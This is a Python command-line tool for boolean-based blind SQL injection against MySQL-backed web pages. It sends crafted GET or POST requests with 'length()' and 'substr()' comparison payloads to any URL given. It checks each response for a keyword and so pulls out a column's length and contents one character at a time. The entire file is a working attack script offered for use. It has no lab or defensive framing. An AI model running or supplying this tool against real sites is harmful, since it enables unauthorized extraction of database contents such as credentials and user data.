import os
import requests
import argparse
import keyboard
from treelib import Node, Tree
from string import ascii_lowercase
from string import digits
from string import punctuation
from colorama import Fore, init
import colorama
colorama.init()

class Mysql:
	def __init__(self, url, column_name, length, sign, data, endpoint, clear):
		self.url = url
		self.column_name = column_name
		self.length = length
		self.sign = sign
		self.data = data
		self.endpoint = endpoint
		self.clear = clear

	def clear_term(self):
		os.system(f"{self.clear}")

	def info(self):
		tree = Tree()
		tree.create_node(f"{Fore.YELLOW}Target" + f"{Fore.RESET}", "target")
		tree.create_node(f"{Fore.YELLOW}Url" + f"{Fore.RESET}", "url", parent="target")
		tree.create_node(f"{Fore.GREEN}{self.url}" + f"{Fore.RESET}", parent="url")
		tree.create_node(f"{Fore.YELLOW}Column" + f"{Fore.RESET}", "column", parent="target")
		tree.create_node(f"{Fore.GREEN}{self.column_name}" + f"{Fore.RESET}", parent="column")
		tree.create_node(f"{Fore.YELLOW}Length" + f"{Fore.RESET}", "length", parent="target")
		tree.create_node(f"{Fore.GREEN}{self.column_name}" + f"{Fore.RESET}", parent="length")
		tree.create_node(f"{Fore.YELLOW}Sign" + f"{Fore.RESET}", "sign", parent="target")
		tree.create_node(f"{Fore.GREEN}{self.sign}" + f"{Fore.RESET}", parent="sign")
		tree.create_node(f"{Fore.YELLOW}Data" + f"{Fore.RESET}", "data", parent="target")
		tree.create_node(f"{Fore.GREEN}{self.data}" + f"{Fore.RESET}", parent="data")
		tree.create_node(f"{Fore.YELLOW}Endpoint" + f"{Fore.RESET}", "endpoint", parent="target")
		tree.create_node(f"{Fore.GREEN}{self.endpoint}" + f"{Fore.RESET}", parent="endpoint")
		tree.show()

	def length_row_get(self):
		print(f"{Fore.WHITE}[{Fore.YELLOW}Length{Fore.WHITE}]: ", end='', flush=True)
		for i in range(0, 100):
			target = requests.get(self.url + f"{self.endpoint} and (select length({self.column_name})=" + str(i) + ")#")
			if self.sign in target.text:
				print(f"{Fore.GREEN}{i}")
				if keyboard.read_key() == "enter":
						break
		
	def length_row_post(self):
		print(f"{Fore.WHITE}[{Fore.YELLOW}Length{Fore.WHITE}]: ", end='', flush=True)
		for i in range(0, 100):
			target = requests.post(self.url, data={f"{self.data}":f"{self.endpoint} and (select length({self.column_name})=" + str(i) + ")#"})
			if self.sign in target.text:
				print(f"{Fore.GREEN}{i}")
				print(f"{Fore.GREEN}\nPress enter to exit")
				if keyboard.read_key() == "enter":
					break
		           

	def substr_row_get(self):
		charset = [str(i) for i in ascii_lowercase + digits + punctuation]
		print(f"{Fore.WHITE}[{Fore.YELLOW}Substring{Fore.WHITE}]: ", end='', flush=True)
		for a in range(0, int(self.length)):
			for b in charset:
				target = requests.get(self.url + f"{self.endpoint} and (select substr({self.column_name}, " + str(a) + ", 1)=0x" + str(b).encode("utf8").hex() +  ")#")
				if self.sign in target.text:
					print(f"{Fore.GREEN}{b}", end='', flush=True)
					if keyboard.read_key() == "enter":
						break

	def substr_row_post(self):
		charset = [str(i) for i in ascii_lowercase + digits + punctuation]
		print(f"{Fore.WHITE}[{Fore.YELLOW}Substring{Fore.WHITE}]: ", end='', flush=True)
		for a in range(0, int(self.length)):
			for b in charset:
				target = requests.post(self.url, data={f"{self.data}":f"{self.endpoint} and (select substr({self.column_name}, " + str(a) + ", 1)=0x" + str(b).encode("utf8").hex() +  ")#"})
				if self.sign in target.text:
					print(f"{Fore.GREEN}{b}", end='', flush=True)

if __name__ == "__main__":
	clear = Mysql(False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
	clear.clear_term()
	parser = argparse.ArgumentParser()
	parser.add_argument('-lrg', '--length_row_get', dest='length_row_get', action='store_true', help="usage: python3 main.py -lrg --url [https://example.com/a.php?id=1] --endpoint ['] --column [name] --sign [keyword]")
	parser.add_argument('-lrp', '--length_row_post', dest='length_row_post', action='store_true', help="usage: python3 main.py -lrp --url [https://example.com/a.php?id=1] --endpoint ['] --data [Data] --column [name] --sign [keyword]")
	parser.add_argument('-srg', '--substr_row_get', dest='substr_row_get', action='store_true', help="usage: python3 main.py -srg --url [https://example.com/a.php?id=1] --endpoint ['] --column [name] --length [int] --sign [keyword]")
	parser.add_argument('-srp', '--substr_row_post', dest='substr_row_post', action='store_true', help="usage: python3 main.py -srp --url [https://example.com/a.php] --endpoint ['] --data [Data] --column [name] --length [int] --sign [keyword]")
	parser.add_argument('-url', '--url', dest='url')
	parser.add_argument('-data', '--data', dest='data')
	parser.add_argument('-endpoint', '--endpoint', dest='endpoint')
	parser.add_argument('-column', '--column', dest='column')
	parser.add_argument('-length', '--length', dest='length')
	parser.add_argument('-sign', '--sign', dest='sign')
	args = parser.parse_args()

	if args.length_row_get:
		if args.endpoint is None:
			args.endpoint = "+"
			length_row_get = Mysql(args.url, args.column, False, args.sign, False, args.endpoint, False)
			info = Mysql(args.url, args.column, False, args.sign, False, args.endpoint, False)
			info.info()
			length_row_get.length_row_get()

	if args.length_row_post:
		if args.endpoint is None:
			args.endpoint = "+"
			length_row_post = Mysql(args.url, args.column, False, args.sign, args.data, args.endpoint, False)
			info = Mysql(args.url, args.column, False, args.sign, args.data, args.endpoint, False)
			info.info()
			length_row_post.length_row_post()

	if args.substr_row_get:
		if args.endpoint is None:
			args.endpoint = "+"
			substr_row_get = Mysql(args.url, args.column, args.length, args.sign, False, args.endpoint,False)
			info = Mysql(args.url, args.column, args.length, args.sign, False, args.endpoint, False)
			info.info()
			substr_row_get.substr_row_get()

	if args.substr_row_post:
		if args.endpoint is None:
			args.endpoint = "+"
			substr_row_post = Mysql(args.url, args.column, args.length, args.sign, args.data, args.endpoint, False)
			info = Mysql(args.url, args.column, args.length, args.sign, args.data, args.endpoint, False)
			info.info()
			substr_row_post.substr_row_post()
